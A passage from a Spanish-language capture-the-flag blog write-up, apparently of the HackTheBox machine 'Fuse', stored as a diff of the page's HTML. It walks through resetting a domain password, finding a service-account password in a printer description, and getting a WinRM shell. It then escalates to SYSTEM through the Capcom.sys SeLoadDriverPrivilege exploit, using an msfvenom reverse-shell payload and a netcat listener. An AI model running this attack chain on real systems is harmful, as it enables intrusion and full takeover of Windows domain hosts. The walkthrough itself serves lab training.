+</span></span></code></pre></div><p>Vamos a poner una password mas robusta</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ impacket-smbpasswd bnielson@10.129.2.5 -newpass Pointed123@
+</span></span><span style="display:flex;"><span>Impacket v0.11.0 - Copyright <span style="color:#ae81ff">2023</span> Fortra
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================================</span>
+</span></span><span style="display:flex;"><span>  Warning: This functionality will be deprecated in the next Impacket version  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Current SMB password: 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Password is expired, trying to bind with a null session.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Password was changed successfully.
+</span></span></code></pre></div><p>Vamos a probar con <code>nxc</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nxc smb 10.129.2.5 -u <span style="color:#e6db74">&#39;bnielson&#39;</span> -p <span style="color:#e6db74">&#39;Pointed123@&#39;</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.2.5      <span style="color:#ae81ff">445</span>    FUSE             <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2016</span> Standard <span style="color:#ae81ff">14393</span> x64 <span style="color:#f92672">(</span>name:FUSE<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:fabricorp.local<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:True<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.2.5      <span style="color:#ae81ff">445</span>    FUSE             <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> fabricorp.local<span style="color:#ae81ff">\b</span>nielson:Pointed123@
+</span></span></code></pre></div><p>Ningún usuario de la lista está en el grupo de <code>Remote Management Users</code> por lo cual no podemos utilizar herramientas como <code>evil-winrm</code> para conseguir una shell.</p>
+<h1 id="-enumerating-smb">📂 Enumerating SMB</h1>
+<p>Cuando intento enumerar el SMB se ha reestablecido la pwd, por lo cual podemos deducir que hay un script por detrás que va reestableciendo la contraseña a estos usuarios.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ smbmap -H 10.129.2.5 -u bnielson -p <span style="color:#e6db74">&#39;ASsdasd23123123@&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> IP: 10.129.2.5:445	Name: fabricorp.local                                   
+</span></span><span style="display:flex;"><span>        Disk                                                  	Permissions	Comment
+</span></span><span style="display:flex;"><span>	----                                                  	-----------	-------
+</span></span><span style="display:flex;"><span>	ADMIN$                                            	NO ACCESS	Remote Admin
+</span></span><span style="display:flex;"><span>	C$                                                	NO ACCESS	Default share
+</span></span><span style="display:flex;"><span>	HP-MFT01                                          	NO ACCESS	HP-MFT01
+</span></span><span style="display:flex;"><span>	IPC$                                              	READ ONLY	Remote IPC
+</span></span><span style="display:flex;"><span>	NETLOGON                                          	READ ONLY	Logon server share 
+</span></span><span style="display:flex;"><span>	print$                                            	READ ONLY	Printer Drivers
+</span></span><span style="display:flex;"><span>	SYSVOL                                            	READ ONLY	Logon server share
+</span></span></code></pre></div><p>Lo único interesante es el recurso <code>print$</code> pero no encontramos nada de interés.</p>
+<h1 id="-enumerating-rpc-and-gaining-foothold">📂 Enumerating RPC and Gaining Foothold</h1>
+<p>Con <code>rpcclient</code> vamos a seguir enumerando usuarios, grupos y equipos.</p>
+<p>Tenemos permisos suficientes, así que perfecto.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ rpcclient -U bnielson%<span style="color:#e6db74">&#39;Wachiturro123@&#39;</span> 10.129.2.5
+</span></span><span style="display:flex;"><span>rpcclient $&gt; enumdomusers
+</span></span><span style="display:flex;"><span>user:<span style="color:#f92672">[</span>Administrator<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x1f4<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>user:<span style="color:#f92672">[</span>Guest<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x1f5<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>user:<span style="color:#f92672">[</span>krbtgt<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x1f6<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>user:<span style="color:#f92672">[</span>DefaultAccount<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x1f7<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>user:<span style="color:#f92672">[</span>svc-print<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x450<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>user:<span style="color:#f92672">[</span>bnielson<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x451<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>user:<span style="color:#f92672">[</span>sthompson<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x641<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>user:<span style="color:#f92672">[</span>tlavel<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x642<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>user:<span style="color:#f92672">[</span>pmerton<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x643<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>user:<span style="color:#f92672">[</span>svc-scan<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x645<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>user:<span style="color:#f92672">[</span>bhult<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x1bbd<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>user:<span style="color:#f92672">[</span>dandrews<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x1bbe<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>user:<span style="color:#f92672">[</span>mberbatov<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x1db1<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>user:<span style="color:#f92672">[</span>astein<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x1db2<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>user:<span style="color:#f92672">[</span>dmuir<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x1db3<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>Vemos un grupo interesante.
+<code>group:[IT_Accounts] rid:[0x644]</code></p>
+<p>Pero no tiene descripción.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>rpcclient $&gt; querygroup 0x644
+</span></span><span style="display:flex;"><span>	Group Name:	IT_Accounts
+</span></span><span style="display:flex;"><span>	Description:	
+</span></span><span style="display:flex;"><span>	Group Attribute:7
+</span></span><span style="display:flex;"><span>	Num Members:2
+</span></span></code></pre></div><p>Como antes hemos visto que existe un servicio de impresión, podemos enumerar las impresoras y encontramos una credencial.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>rpcclient $&gt; enumprinters
+</span></span><span style="display:flex;"><span>	flags:<span style="color:#f92672">[</span>0x800000<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>	name:<span style="color:#f92672">[</span><span style="color:#ae81ff">\\</span>10.129.2.5<span style="color:#ae81ff">\H</span>P-MFT01<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>	description:<span style="color:#f92672">[</span><span style="color:#ae81ff">\\</span>10.129.2.5<span style="color:#ae81ff">\H</span>P-MFT01,HP Universal Printing PCL 6,Central <span style="color:#f92672">(</span>Near IT, scan2docs password: $fab@s3Rv1ce$1<span style="color:#f92672">)]</span>
+</span></span><span style="display:flex;"><span>	comment:<span style="color:#f92672">[]</span>
+</span></span></code></pre></div><p>con <code>nxc</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>v1ce$1 STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.2.5      <span style="color:#ae81ff">445</span>    FUSE             <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> fabricorp.local<span style="color:#ae81ff">\s</span>vc-print:$fab@s3Rv1ce$1
+</span></span></code></pre></div><p>Y este usuario tiene permiso para conectarse mediante WinRM <del>(por la cara)</del></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nxc winrm 10.129.2.5 -u svc-print -p <span style="color:#e6db74">&#39;$fab@s3Rv1ce$1&#39;</span> 
+</span></span><span style="display:flex;"><span>WINRM       10.129.2.5      <span style="color:#ae81ff">5985</span>   FUSE             <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> / Server <span style="color:#ae81ff">2016</span> Build <span style="color:#ae81ff">14393</span> <span style="color:#f92672">(</span>name:FUSE<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:fabricorp.local<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>WINRM       10.129.2.5      <span style="color:#ae81ff">5985</span>   FUSE             <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> fabricorp.local<span style="color:#ae81ff">\s</span>vc-print:$fab@s3Rv1ce$1 <span style="color:#f92672">(</span>Pwn3d!<span style="color:#f92672">)</span>
+</span></span></code></pre></div><h2 id="connecting-via-winrm">Connecting via WinRM</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ evil-winrm -i 10.129.2.5 -u svc-print -p <span style="color:#e6db74">&#39;$fab@s3Rv1ce$1&#39;</span>
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Evil-WinRM shell v3.5
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span style="color:#f92672">()</span> <span style="color:#66d9ef">function</span> is unimplemented on this machine
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Info: Establishing connection to remote endpoint
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\s</span>vc-print<span style="color:#ae81ff">\D</span>ocuments&gt; whoami
+</span></span><span style="display:flex;"><span>fabricorp<span style="color:#ae81ff">\s</span>vc-print
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Privilege Escalation </span>
+</span></span><span style="display:flex;"><span>Vemos que este usuario tiene el privilegio SeLoadDriverPrivilege, este privilegio ya lo he explotado varias veces, podemos hacer uso de un driver vulnerable especialmente diseñado para escalar privilegios y convertirnos en administradores.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">```</span>shell
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers&gt; whoami /priv
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PRIVILEGES INFORMATION
+</span></span><span style="display:flex;"><span>----------------------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Privilege Name                Description                    State
+</span></span><span style="display:flex;"><span><span style="color:#f92672">=============================</span> <span style="color:#f92672">==============================</span> <span style="color:#f92672">=======</span>
+</span></span><span style="display:flex;"><span>SeMachineAccountPrivilege     Add workstations to domain     Enabled
+</span></span><span style="display:flex;"><span>SeLoadDriverPrivilege         Load and unload device drivers Enabled
+</span></span><span style="display:flex;"><span>SeShutdownPrivilege           Shut down the system           Enabled
+</span></span><span style="display:flex;"><span>SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+</span></span><span style="display:flex;"><span>SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+</span></span></code></pre></div><p>Haciendo uso de este <a href="https://github.com/JoshMorrison99/SeLoadDriverPrivilege">PoC</a> , podemos ahorrarnos mucho trabajo. TarLogic hizo un <a href="https://www.tarlogic.com/blog/seloaddriverprivilege-privilege-escalation/">post</a> de la explotación de este caso muy interesante.</p>
+<p>Primero, con <code>msfvenom</code>, nos creamos un payload de reverse shell para windows x64.</p>
+<p><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.71 LPORT=443 -f exe -o rev.exe</code></p>
+<p>Ahora, nos descargamos el repositorio anteriormente mencionado, debemos de subir los archivos <code>Capcom.sys</code> , <code>LoadDriver.exe</code> , <code>rev.exe</code> y <code>ExploitCapcom.exe</code></p>
+<p>Como tenemos una consola con <code>evil-winrm</code> podemos subir directamente los archivos ya que es una funcionalidad adicional que incluye esta herramienta.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\svc-print\privesc&gt; upload rev.exe
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Info: Uploading /home/pointedsec/Desktop/fuse/content/rev.exe to C:\Users\svc-print\privesc\rev.exe
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Data: 9556 bytes of 9556 bytes copied
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Info: Upload successful!
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\svc-print\privesc&gt; upload SeLoadDriverPrivilege/Capcom.sys
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Info: Uploading /home/pointedsec/Desktop/fuse/content/SeLoadDriverPrivilege/Capcom.sys to C:\Users\svc-print\privesc\Capcom.sys
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Data: 14100 bytes of 14100 bytes copied
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Info: Upload successful!
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\svc-print\privesc&gt; upload SeLoadDriverPrivilege/LoadDriver.exe
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Info: Uploading /home/pointedsec/Desktop/fuse/content/SeLoadDriverPrivilege/LoadDriver.exe to C:\Users\svc-print\privesc\LoadDriver.exe
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Data: 20480 bytes of 20480 bytes copied
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Info: Upload successful!
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\svc-print\privesc&gt; upload SeLoadDriverPrivilege/ExploitCapcom.exe 
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Info: Uploading /home/pointedsec/Desktop/fuse/content/SeLoadDriverPrivilege/ExploitCapcom.exe to C:\Users\svc-print\privesc\ExploitCapcom.exe
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Data: 357716 bytes of 357716 bytes copied
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Info: Upload successful!
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\svc-print\privesc&gt; dir
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Directory: C:\Users\svc-print\privesc
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Mode                LastWriteTime         Length Name
+</span></span><span style="display:flex;"><span>----                -------------         ------ ----
+</span></span><span style="display:flex;"><span>-a----        7/29/2024   1:27 PM          10576 Capcom.sys
+</span></span><span style="display:flex;"><span>-a----        7/29/2024   1:27 PM         268288 ExploitCapcom.exe
+</span></span><span style="display:flex;"><span>-a----        7/29/2024   1:27 PM          15360 LoadDriver.exe
+</span></span><span style="display:flex;"><span>-a----        7/29/2024   1:27 PM           7168 rev.exe
+</span></span></code></pre></div><p>Ahora, nos ponemos con <code>netcat</code> en escucha por el puert 443.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo rlwrap -cEr nc -lvnp <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
+</span></span></code></pre></div><p>Y en la máquina víctima, ejecutamos el <code>LoadDriver.exe</code> , debemos especificarle una ruta para cargar el drive en el registro, puede ser la que sea dentro de <code>CurrentControlSet</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\svc-print\privesc&gt; .\LoadDriver.exe System\CurrentControlSet\MyService C:\Users\svc-print\privesc\Capcom.sys
+</span></span><span style="display:flex;"><span>[+] Enabling SeLoadDriverPrivilege
+</span></span><span style="display:flex;"><span>[+] SeLoadDriverPrivilege Enabled
+</span></span><span style="display:flex;"><span>[+] Loading Driver: \Registry\User\S-1-5-21-2633719317-1471316042-3957863514-1104\System\CurrentControlSet\MyService
+</span></span><span style="display:flex;"><span>NTSTATUS: 00000000, WinError: 0
+</span></span></code></pre></div><p>Y ahora, ejecutamos el <code>ExploitCapcom.exe</code>, en la documentación dice de mover <code>rev.exe</code> a <code>C:\Windows\Temp\rev.exe</code> y ejecutar <code>ExploitCapcom.exe</code> sin parámetros, pero esto no me ha funcionado por alguna razón, <strong>así que le especificamos la ruta de <code>rev.exe</code> como parámetro</strong>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\s</span>vc-print<span style="color:#ae81ff">\p</span>rivesc&gt; .<span style="color:#ae81ff">\E</span>xploitCapcom.exe C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\s</span>vc-print<span style="color:#ae81ff">\p</span>rivesc<span style="color:#ae81ff">\r</span>ev.exe
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Path is: C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\s</span>vc-print<span style="color:#ae81ff">\p</span>rivesc<span style="color:#ae81ff">\r</span>ev.exe
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Capcom.sys exploit
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Capcom.sys handle was obtained as <span style="color:#ae81ff">0000000000000064</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Shellcode was placed at 000001AF5B210008
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Shellcode was executed
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Token stealing was successful
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> The SYSTEM shell was launched
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Press any key to exit this program
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo rlwrap -cEr nc -lvnp <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>10.10.14.71<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.129.2.5<span style="color:#f92672">]</span> <span style="color:#ae81ff">50550</span>
+</span></span><span style="display:flex;"><span>Microsoft Windows <span style="color:#f92672">[</span>Version 10.0.14393<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2016</span> Microsoft Corporation. All rights reserved.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\s</span>vc-print<span style="color:#ae81ff">\p</span>rivesc&gt;whoami
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>nt authority<span style="color:#ae81ff">\s</span>ystem
+</span></span></code></pre></div><p>Y ya hemos conseguido acceso como el usuario <code>nt authority\system</code> por lo cual hemos escalado privilegios y hemos terminado esta máquina.</p>
+<p>Happy Hacking! 🚀</p>
+
+    </div>
+
+    
+
+            </div>
+        </div><footer class="text-center pb-1">
+    <small class="text-muted">
+        
+            &copy; 2024, Andrés Del Cerro
+        
+        <br>
+        Powered by <a href="https://gohugo.io/" target="_blank">Hugo</a>
+        and <a href="https://github.com/austingebauer/devise" target="_blank">Devise</a>
+    </small>
+</footer>
+</body>
+</html>
